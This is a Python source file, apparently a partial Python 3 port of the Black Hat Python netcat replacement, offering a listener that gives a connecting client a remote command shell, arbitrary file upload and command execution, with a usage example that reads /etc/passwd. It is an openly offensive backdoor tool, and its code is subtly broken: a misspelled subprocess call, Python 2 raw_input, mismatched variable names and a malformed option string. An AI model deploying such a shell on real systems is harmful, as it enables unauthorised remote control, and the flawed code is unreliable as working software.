"""
Python Netcat Replacement
by Adam Stebbing
2/3/2019

Based off of code found in Black Hat Python, edited for Python3
"""

import sys
import socket
import getopt
import threading
import subprocess

# Global Variables
listen      = False
command     = False
upload      = False
execute     = ""
target      = ""
upload_dest = ""
port        = 0

def usage():
    print("BHP Net Tool\n")
    print("Usage: utility.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon recieving a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon recieving connection upload a file and write to [destination]")
    print()
    print("Examples: \nutility.py -t 192.168.0.1 -p 5555 -l -c")
    print("utility.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("utility.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGH' | ./utility.py -t 192.168.0.1 -p 135")
    sys.exit(0)

def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to target host
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
        while True:
            # Wait for data back
            recv_len = 1
            response = ""
            while recv_len:
                data        = client.recv(4096)
                recv_len    = len(data)
                response   += data
                if recv_len < 4096:
                    break
            print(response)

            # Wait for more input
            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)
    except:
        print("[*] Exception! Exiting.")
        client.close()

def server_loop():
    global target

    # Listen on all interfaces if no target defined
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # Create thread to handle new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_ouput(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output

def client_handler(client_socket):
    global upload, execute, command

    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Succesfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send("<Utility:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            response = run_command(cmd_buffer)
            client_socket.send(response)


def main():
    global listen, port, execute, command, upload_destination, target

    if not len(sys.argv[1:]):
        usage()

    # Read in Options
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:[:cu", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        # read in buffer cmdline
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()

main()
